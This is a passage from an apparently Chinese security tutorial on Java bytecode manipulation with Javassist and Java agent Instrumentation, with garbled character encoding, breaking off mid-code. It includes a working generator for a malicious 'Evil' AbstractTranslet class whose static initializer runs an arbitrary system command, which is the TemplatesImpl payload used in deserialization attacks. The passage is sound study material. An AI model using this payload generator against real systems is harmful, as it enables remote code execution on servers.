æ’å…¥åœ¨æ–¹æ³•ä½“æœ€å‰é¢</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">insertBefore</span><span class="hljs-params">(String src)</span>;<br> <br>    <span class="hljs-comment">// æ’å…¥åœ¨æ–¹æ³•ä½“æœ€åé¢</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">insertAfter</span><span class="hljs-params">(String src)</span>;<br> <br>    <span class="hljs-comment">// åœ¨æ–¹æ³•ä½“çš„æŸä¸€è¡Œæ’å…¥å†…å®¹</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">insertAt</span><span class="hljs-params">(<span class="hljs-type">int</span> lineNum, String src)</span>;<br> <br>&#125;<br>    <br></code></pre></td></tr></table></figure><p>å…¶ä¸­ä¼ é€’ç»™<code>insertBefore</code>ã€<code>insertAfter</code>å’Œ<code>insertAt</code>çš„Stringå¯¹è±¡æ˜¯ç”±<code>Javassist</code>çš„ç¼–è¯‘å™¨è¿›è¡Œç¼–è¯‘çš„ã€‚è¯¥ç¼–è¯‘å™¨æ”¯æŒè¯­è¨€çš„æ‰©å±•ï¼Œä»¥ä¸‹ä»¥$ç¬¦å·å¼€å¤´çš„å‡ ä¸ªæ ‡è¯†ç¬¦å…·æœ‰ç‰¹æ®Šçš„å«ä¹‰ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081524285.png" alt="img"></p><h4 id="Javassist-ä½¿ç”¨"><a href="#Javassist-ä½¿ç”¨" class="headerlink" title="Javassist ä½¿ç”¨"></a>Javassist ä½¿ç”¨</h4><p>ä¾èµ–ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>  <br>  <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.javassist<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>  <br>  <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>javassist<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>  <br>  <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.27.0-GA<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>  <br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>ä½¿ç”¨ javassist åˆ›å»ºä¸€ä¸ª Person ç±»</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.test;<br><br><span class="hljs-keyword">import</span> javassist.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JavassistDemo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">CreatePerson</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-comment">//è·å– CtClass å¯¹è±¡å®¹å™¨ ClassPool</span><br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">classPool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-comment">//åˆ›å»ºä¸€ä¸ªæ–°ç±» Javassist.Learning.Person</span><br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> classPool.makeClass(<span class="hljs-string">&quot;javassist.Person&quot;</span>);<br>        <span class="hljs-comment">//åˆ›å»ºä¸€ä¸ª Person ç±»çš„å±æ€§ name</span><br>        <span class="hljs-type">CtField</span> <span class="hljs-variable">ctField1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtField</span>(classPool.get(<span class="hljs-string">&quot;java.lang.String&quot;</span>),<span class="hljs-string">&quot;name&quot;</span>, ctClass);<br>        <span class="hljs-comment">//è®¾ç½®å±æ€§è®¿é—®ç¬¦</span><br>        ctField1.setModifiers(Modifier.PRIVATE);<br>        <span class="hljs-comment">//å°†å±æ€§æ·»åŠ åˆ° Personä¸­ï¼Œå¹¶è®¾ç½®åˆå§‹å€¼</span><br>        ctClass.addField(ctField1,CtField.Initializer.constant(<span class="hljs-string">&quot;aaa&quot;</span>));<br><br>        <span class="hljs-comment">//å‘ Person ç±»ä¸­æ·»åŠ  setter å’Œ getter æ–¹æ³•</span><br>        ctClass.addMethod(CtNewMethod.setter(<span class="hljs-string">&quot;setName&quot;</span>,ctField1));<br>        ctClass.addMethod(CtNewMethod.getter(<span class="hljs-string">&quot;getName&quot;</span>,ctField1));<br><br>        <span class="hljs-comment">//åˆ›å»ºä¸€ä¸ªæ— å‚æ„é€ </span><br>        <span class="hljs-type">CtConstructor</span> <span class="hljs-variable">ctConstructor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtConstructor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[]&#123;&#125;, ctClass);<br>        <span class="hljs-comment">//è®¾ç½®æ–¹æ³•ä½“</span><br>        ctConstructor.setBody(<span class="hljs-string">&quot;&#123;name = \&quot;aaa\&quot;;&#125;&quot;</span>);<br>        <span class="hljs-comment">//å‘ Person ç±»ä¸­æ·»åŠ æ— å‚æ„é€ </span><br>        ctClass.addConstructor(ctConstructor);<br><br>        <span class="hljs-comment">//åˆ›å»ºä¸€ä¸ªç±»æ–¹æ³• printName</span><br>        <span class="hljs-type">CtMethod</span> <span class="hljs-variable">ctMethod</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtMethod</span>(CtClass.voidType, <span class="hljs-string">&quot;printName&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[]&#123;&#125;, ctClass);<br>        <span class="hljs-comment">//è®¾ç½®æ–¹æ³•è®¿é—®ç¬¦</span><br>        ctMethod.setModifiers(Modifier.PUBLIC);<br>        <span class="hljs-comment">//è®¾ç½®æ–¹æ³•ä½“</span><br>        ctMethod.setBody(<span class="hljs-string">&quot;&#123;System.out.println(\&quot;Hello World\&quot;);&#125;&quot;</span>);<br>        <span class="hljs-comment">//å°†æ–¹æ³•æ·»åŠ è‡³ Person ä¸­</span><br>        ctClass.addMethod(ctMethod);<br><br>        <span class="hljs-comment">//å°†ç”Ÿæˆçš„å­—èŠ‚ç å†™å…¥æ–‡ä»¶ä¸­</span><br>        ctClass.writeFile();<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        System.out.println(<span class="hljs-string">&quot;start&quot;</span>);<br>        CreatePerson();<br>        System.out.println(<span class="hljs-string">&quot;finish&quot;</span>);<br>    &#125;<br>&#125;<br><br> <br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523506.png" alt="img"></p><p>åˆ›å»ºå¥½çš„ Person.class</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//</span><br><span class="hljs-comment">// Source code recreated from a .class file by IntelliJ IDEA</span><br><span class="hljs-comment">// (powered by FernFlower decompiler)</span><br><span class="hljs-comment">//</span><br><br><span class="hljs-keyword">package</span> javassist;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;aaa&quot;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String var1)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = var1;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-built_in">super</span>();<br>        <span class="hljs-built_in">this</span>.name = <span class="hljs-string">&quot;aaa&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">printName</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;Hello World&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="ä½¿ç”¨Javassistç”Ÿæˆæ¶æ„class"><a href="#ä½¿ç”¨Javassistç”Ÿæˆæ¶æ„class" class="headerlink" title="ä½¿ç”¨Javassistç”Ÿæˆæ¶æ„class"></a>ä½¿ç”¨Javassistç”Ÿæˆæ¶æ„class</h4><p>ä»å­—èŠ‚ç å±‚é¢ç”Ÿæˆæ¶æ„ class ï¼Œè·³è¿‡æ¶æ„ç±»çš„ç¼–è¯‘è¿‡ç¨‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.javassist;<br><br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtConstructor;<br><br><span class="hljs-keyword">import</span> java.io.File;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">createShell</span> &#123;<br>    <br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * ç”ŸæˆåŒ…å«æ¶æ„å‘½ä»¤çš„TemplatesImplå­—èŠ‚ç </span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> cmd è¦æ‰§è¡Œçš„ç³»ç»Ÿå‘½ä»¤</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> ç”Ÿæˆçš„å­—èŠ‚ç æ•°ç»„</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] getTemplatesImpl(String cmd) &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">// è·å–é»˜è®¤çš„ç±»æ± </span><br>            <span class="hljs-type">ClassPool</span> <span class="hljs-variable">classPool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>            <br>            <span class="hljs-comment">// åˆ›å»ºä¸€ä¸ªæ–°çš„ç±»ï¼Œåä¸º&quot;Evil&quot;</span><br>            <span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> classPool.makeClass(<span class="hljs-string">&quot;Evil&quot;</span>);<br>            <br>            <span class="hljs-comment">// è·å–AbstractTransletç±»ä½œä¸ºçˆ¶ç±»</span><br>            <span class="hljs-comment">// è¿™æ˜¯XSLTè½¬æ¢å™¨çš„åŸºç±»ï¼Œå¸¸ç”¨äºJavaååºåˆ—åŒ–åˆ©ç”¨</span><br>            <span class="hljs-type">CtClass</span> <span class="hljs-variable">superClass</span> <span class="hljs-operator">=</span> classPool.get(<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>);<br>            ctClass.setSuperclass(superClass);<br>            <br>            <span class="hljs-comment">// åˆ›å»ºç±»çš„åˆå§‹åŒ–æ„é€ å‡½æ•°</span><br>            <span class="hljs-type">CtConstructor</span> <span class="hljs-variable">ctConstructor</span> <span class="hljs-operator">=</span> ctClass.makeClassInitializer();<br>            <br>            <span class="hljs-comment">// åœ¨æ„é€ å‡½æ•°ä½“ä¸­æ’å…¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„ä»£ç </span><br>            ctConstructor.setBody(<span class="hljs-string">&quot;try&#123;\n&quot;</span> +<br>                    <span class="hljs-string">&quot;            Runtime.getRuntime().exec(\&quot;&quot;</span> + cmd + <span class="hljs-string">&quot;\&quot;);\n&quot;</span> +  <span class="hljs-comment">// æ‰§è¡Œä¼ å…¥çš„å‘½ä»¤</span><br>                    <span class="hljs-string">&quot;        &#125;catch (Exception e)&#123;\n&quot;</span> +<br>                    <span class="hljs-string">&quot;        &#125;&quot;</span>);  <span class="hljs-comment">// å¼‚å¸¸å¤„ç†ï¼Œé™é»˜å¤±è´¥</span><br>            <br>            <span class="hljs-comment">// å°†CtClassè½¬æ¢ä¸ºå­—èŠ‚æ•°ç»„</span><br>            <span class="hljs-type">byte</span>[] bytes = ctClass.toBytecode();<br>            <br>            <span class="hljs-comment">// ä»ç±»æ± ä¸­åˆ†ç¦»è¯¥ç±»ï¼Œé‡Šæ”¾èµ„æº</span><br>            ctClass.detach();<br>            <br>            <span class="hljs-keyword">return</span> bytes;<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[]&#123;&#125;;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * å°†ç”Ÿæˆçš„æ¶æ„ç±»å­—èŠ‚ç å†™å…¥æ–‡ä»¶</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@throws</span> Exception</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">writeShell</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">// ç”Ÿæˆæ‰§è¡Œcalcå‘½ä»¤çš„æ¶æ„å­—èŠ‚ç </span><br>        <span class="hljs-type">byte</span>[] shell = createShell.getTemplatesImpl(<span class="hljs-string">&quot;calc&quot;</span>);<br>        <br>        <span class="hljs-comment">// åˆ›å»ºæ–‡ä»¶è¾“å‡ºæµï¼Œå°†å­—èŠ‚ç å†™å…¥bbb.classæ–‡ä»¶</span><br>        <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">fileOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;bbb.class&quot;</span>));<br>        fileOutputStream.write(shell);<br>        <br>        <span class="hljs-comment">// æ³¨æ„ï¼šè¿™é‡Œåº”è¯¥å…³é—­æµï¼Œå»ºè®®ä½¿ç”¨try-with-resources</span><br>        fileOutputStream.close();<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * ä¸»æ–¹æ³• - ç¨‹åºå…¥å£</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> args å‘½ä»¤è¡Œå‚æ•°</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@throws</span> Exception</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        writeShell();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523107.png" alt="img"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//</span><br><span class="hljs-comment">// Source code recreated from a .class file by IntelliJ IDEA</span><br><span class="hljs-comment">// (powered by FernFlower decompiler)</span><br><span class="hljs-comment">//</span><br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Evil</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span> &#123;<br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception var1) &#123;<br>        &#125;<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Evil</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-built_in">super</span>();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="4-2-2-Instrumentation-åŠ¨æ€ä¿®æ”¹å­—èŠ‚ç "><a href="#4-2-2-Instrumentation-åŠ¨æ€ä¿®æ”¹å­—èŠ‚ç " class="headerlink" title="4.2.2 Instrumentation åŠ¨æ€ä¿®æ”¹å­—èŠ‚ç "></a>4.2.2 Instrumentation åŠ¨æ€ä¿®æ”¹å­—èŠ‚ç </h3><p> Instrumentationæ˜¯ JVMTIAgentï¼ˆJVM Tool Interface Agentï¼‰çš„ä¸€éƒ¨åˆ†ï¼ŒJava agenté€šè¿‡è¿™ä¸ªç±»å’Œç›®æ ‡ JVM è¿›è¡Œäº¤äº’ï¼Œä»è€Œè¾¾åˆ°ä¿®æ”¹æ•°æ®çš„æ•ˆæœã€‚  </p><p> å…¶åœ¨Javaä¸­æ˜¯ä¸€ä¸ªæ¥å£ï¼Œå¸¸ç”¨æ–¹æ³•å¦‚ä¸‹  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Instrumentation</span> &#123;<br>    <br>    <span class="hljs-comment">//å¢åŠ ä¸€ä¸ªClass æ–‡ä»¶çš„è½¬æ¢å™¨ï¼Œè½¬æ¢å™¨ç”¨äºæ”¹å˜ Class äºŒè¿›åˆ¶æµçš„æ•°æ®ï¼Œå‚æ•° canRetransform è®¾ç½®æ˜¯å¦å…è®¸é‡æ–°è½¬æ¢ã€‚</span><br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">addTransformer</span><span class="hljs-params">(ClassFileTransformer transformer, <span class="hljs-type">boolean</span> canRetransform)</span>;<br> <br>    <span class="hljs-comment">//åœ¨ç±»åŠ è½½ä¹‹å‰ï¼Œé‡æ–°å®šä¹‰ Class æ–‡ä»¶ï¼ŒClassDefinition è¡¨ç¤ºå¯¹ä¸€ä¸ªç±»æ–°çš„å®šä¹‰ï¼Œå¦‚æœåœ¨ç±»åŠ è½½ä¹‹åï¼Œéœ€è¦ä½¿ç”¨ retransformClasses æ–¹æ³•é‡æ–°å®šä¹‰ã€‚addTransformeræ–¹æ³•é…ç½®ä¹‹åï¼Œåç»­çš„ç±»åŠ è½½éƒ½ä¼šè¢«Transformeræ‹¦æˆªã€‚å¯¹äºå·²ç»åŠ è½½è¿‡çš„ç±»ï¼Œå¯ä»¥æ‰§è¡ŒretransformClassesæ¥é‡æ–°è§¦å‘è¿™ä¸ªTransformerçš„æ‹¦æˆªã€‚ç±»åŠ è½½çš„å­—èŠ‚ç è¢«ä¿®æ”¹åï¼Œé™¤éå†æ¬¡è¢«retransformï¼Œå¦åˆ™ä¸ä¼šæ¢å¤ã€‚</span><br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">addTransformer</span><span class="hljs-params">(ClassFileTransformer transformer)</span>;<br> <br>    <span class="hljs-comment">//åˆ é™¤ä¸€ä¸ªç±»è½¬æ¢å™¨</span><br>    <span class="hljs-type">boolean</span> <span class="hljs-title function_">removeTransformer</span><span class="hljs-params">(ClassFileTransformer transformer)</span>;<br> <br> <br>    <span class="hljs-comment">//åœ¨ç±»åŠ è½½ä¹‹åï¼Œé‡æ–°å®šä¹‰ Classã€‚è¿™ä¸ªå¾ˆé‡è¦ï¼Œè¯¥æ–¹æ³•æ˜¯1.6 ä¹‹ååŠ å…¥çš„ï¼Œäº‹å®ä¸Šï¼Œè¯¥æ–¹æ³•æ˜¯ update äº†ä¸€ä¸ªç±»ã€‚</span><br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">retransformClasses</span><span class="hljs-params">(Class&lt;?&gt;... classes)</span> <span class="hljs-keyword">throws</span> UnmodifiableClassException;<br> <br>    <span class="hljs-comment">//åˆ¤æ–­ä¸€ä¸ªç±»æ˜¯å¦è¢«ä¿®æ”¹</span><br>    <span class="hljs-type">boolean</span> <span class="hljs-title function_">isModifiableClass</span><span class="hljs-params">(Class&lt;?&gt; theClass)</span>;<br> <br>    <span class="hljs-comment">// è·å–ç›®æ ‡å·²ç»åŠ è½½çš„ç±»ã€‚</span><br>    <span class="hljs-meta">@SuppressWarnings(&quot;rawtypes&quot;)</span><br>    Class[] getAllLoadedClasses();<br> <br>    <span class="hljs-comment">//è·å–ä¸€ä¸ªå¯¹è±¡çš„å¤§å°</span><br>    <span class="hljs-type">long</span> <span class="hljs-title function_">getObjectSize</span><span class="hljs-params">(Object objectToSize)</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="è·å–ç›®æ ‡JVMå·²åŠ è½½ç±»"><a href="#è·å–ç›®æ ‡JVMå·²åŠ è½½ç±»" class="headerlink" title="è·å–ç›®æ ‡JVMå·²åŠ è½½ç±»"></a>è·å–ç›®æ ‡JVMå·²åŠ è½½ç±»</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.test;<br><br><span class="hljs-keyword">import</span> java.lang.instrument.Instrumentation;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Java_Agent_agentmain_Instrumentation</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">agentmain</span><span class="hljs-params">(String args,  Instrumentation inst)</span> <span class="hljs-keyword">throws</span> InterruptedException&#123;<br>        Class[] classes = inst.getAllLoadedClasses();<br><br>        <span class="hljs-keyword">for</span>(Class cls : classes)&#123;<br>            System.out.println(<span class="hljs-string">&quot;=======================&quot;</span>);<br>            System.out.println(<span class="hljs-string">&quot;åŠ è½½ç±»ï¼š&quot;</span> + cls.getName());<br>            System.out.println(<span class="hljs-string">&quot;æ˜¯å¦å¯è¢«ä¿®æ”¹ï¼š&quot;</span> + inst.isModifiableClass(cls));<br>        &#125;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plain">Manifest-Version: 1.0<br>Agent-Class: com.test.Java_Agent_agentmain_Instrumentation<br>Can-Redefine-Classes: true<br>Can-Retransform-Classes: true<br>Can-Set-Native-Method-Prefix: true<br></code></pre></td></tr></table></figure><p>åˆ›å»º jar</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">jar cvfm Instrumentation.jar ..\src\main\resources\MANIFEST.MF .\Java_Agent_agentmain_Instrumentation.<span class="hljs-keyword">class</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081533461.png" alt="img"></p><p>ä½¿ç”¨ InjectAgent.java æµ‹è¯•</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081524580.png" alt="img"></p><p> èƒ½å¤Ÿè·å–ç›®æ ‡JVMå·²åŠ è½½ç±»</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523648.png" alt="img"></p><h4 id="transform-è½¬æ¢å™¨"><a href="#transform-è½¬æ¢å™¨" class="headerlink" title="transform - è½¬æ¢å™¨"></a>transform - è½¬æ¢å™¨</h4><p>åœ¨Instrumentationæ¥å£ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡**addTransformer()**æ¥æ·»åŠ ä¸€ä¸ªtransformerï¼ˆè½¬æ¢å™¨ï¼‰ï¼Œå…³é”®å±æ€§å°±æ˜¯ClassFileTransformerç±»ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//å¢åŠ ä¸€ä¸ªClass æ–‡ä»¶çš„è½¬æ¢å™¨ï¼Œè½¬æ¢å™¨ç”¨äºæ”¹å˜ Class 